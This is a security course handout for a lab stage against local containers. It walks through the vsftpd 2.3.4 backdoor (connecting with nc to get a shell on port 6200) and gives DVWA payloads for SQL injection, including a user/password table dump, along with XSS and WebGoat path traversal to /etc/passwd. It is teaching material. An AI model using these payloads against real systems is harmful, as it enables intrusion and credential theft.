#### Seminar 13 – Stage 4

## Controlled Exploitation: FTP Backdoor + SQL Injection

This stage puts the previously identified vulnerabilities into practice.
All exploits are **controlled**, running against local containers, so that you understand:

* how vulnerabilities are triggered
* what indicators confirm them
* what a real exploit looks like (including writing one in Python)

---

# 1. Exploit 1 – vsftpd 2.3.4 "smiley backdoor" (CVE-2011-2523)

One of the most widely known FTP vulnerabilities.
Version `2.3.4` was released containing an intentional backdoor:

### How does it work?

* If an attacker sends a username containing **`: )`**, the server:

  * responds normally (220 ready)
  * then opens a **backdoor shell** on port **6200**

* Any client that connects to port 6200 obtains a root shell (in the original version); in our container, a restricted shell for safety.

### 1.1. Step 1: normal FTP connection

```bash
nc 172.20.0.12 2121
```

You should see:

```
220 (vsFTPd 2.3.4)
```

### 1.2. Step 2: send the special username

```
USER test:)
PASS xyz
```

The server gives no visible indication, but **the backdoor is now active**.

### 1.3. Step 3: connect to port 6200

In another terminal:

```bash
nc 172.20.0.12 6200
```

You will receive a prompt and can try:

```
id
whoami
```

In our container, you will obtain a restricted shell.

This vulnerability is exploited in Stage 5 with a Python script.

---

# 2. Exploit 2 – SQL Injection in DVWA (Security Level: LOW)

### Authentication:

* USER: `admin`
* PASS: `password`

Navigate to:

```
SQL Injection
```

Enter:

```
1' OR '1'='1
```

Indicators that the application is vulnerable:

* the full list of users is returned
* the URL remains unchanged
* no input validation is performed

### Example payload for a full table dump:

```
1' UNION SELECT user, password FROM users #
```

---

# 3. Exploit 3 – XSS in DVWA (low security)

Enter in the input field:

```
<script>alert('hacked')</script>
```

If the browser displays a pop-up, XSS is active.

---

# 4. Exploit 4 – Path Traversal in WebGoat

WebGoat includes a module called "Path Traversal".
Try:

```
../../../../etc/passwd
```

---

# 5. What Comes Next?

In **Stage 5**, we will:

* write a complete Python script that:

  1. connects to the vulnerable FTP service
  2. triggers the backdoor
  3. connects to port 6200
  4. executes commands automatically
